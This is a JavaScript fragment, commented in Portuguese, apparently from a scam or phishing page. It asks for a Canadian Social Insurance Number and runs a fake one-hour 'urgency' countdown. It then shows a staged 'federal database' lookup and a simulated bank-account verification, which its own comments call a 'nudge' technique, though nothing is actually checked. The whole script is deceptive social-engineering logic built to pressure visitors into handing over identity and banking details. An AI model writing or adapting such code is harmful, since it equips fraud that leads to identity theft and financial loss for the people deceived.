        // Lógica de Contagem Regressiva (Urgência)
        let totalSeconds = 3600; // 1 hora
        function updateCountdown() {
            if (totalSeconds <= 0) return;
            totalSeconds--;
            const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
            const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
            const seconds = String(totalSeconds % 60).padStart(2, '0');
            const timeString = `${hours}:${minutes}:${seconds}`;
            
            const display1 = document.getElementById('countdown-display');
            const display2 = document.getElementById('countdown-display-2');
            if(display1) display1.innerText = timeString;
            if(display2) display2.innerText = timeString;
        }
        setInterval(updateCountdown, 1000);

        // Lógica de Navegação entre Etapas
        document.getElementById('verifyBtn').addEventListener('click', () => {
            const sin = document.getElementById('sin').value;
            if(sin.length < 9) {
                alert("Por favor, insira um SIN válido (formato 000-000-000).");
                return;
            }
            // Simula processamento
            const btn = document.getElementById('verifyBtn');
            btn.innerText = "Consultando Base Federal...";
            btn.disabled = true;
            
            setTimeout(() => {
                document.getElementById('step-1').classList.add('hidden');
                document.getElementById('step-2').classList.remove('hidden');
                simulateBankVerification();
            }, 2500);
        });

        // Simulação de Verificação Bancária (Técnica de "Nudge")
        function simulateBankVerification() {
            const progressBar = document.getElementById('bankProgress');
            const statusText = document.getElementById('bankStatus');
            const messages = [
                "Conectando ao gateway do banco...",
                "Validando números de trânsito...",
                "Confirmando titularidade da conta...",
                "Conta verificada com sucesso."
            ];
            let progress = 0;
            let msgIndex = 0;
            
            const interval = setInterval(() => {
                progress += 10;
                progressBar.style.width = progress + '%';
                
                if (progress % 25 === 0 && msgIndex < messages.length - 1) {
                    statusText.innerText = messages[msgIndex];
                    msgIndex++;
                }

                if (progress >= 100) {
                    clearInterval(interval);
                    statusText.innerText = messages[3];
                    statusText.style.color = 'var(--success)';
                    document.getElementById('confirmBankBtn').classList.remove('hidden');
                }
            }, 400);
        }

        document.getElementById('confirmBankBtn').addEventListener('click', () => {
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-3').classList.remove('hidden');
            window.scrollTo(0, 0);
        });
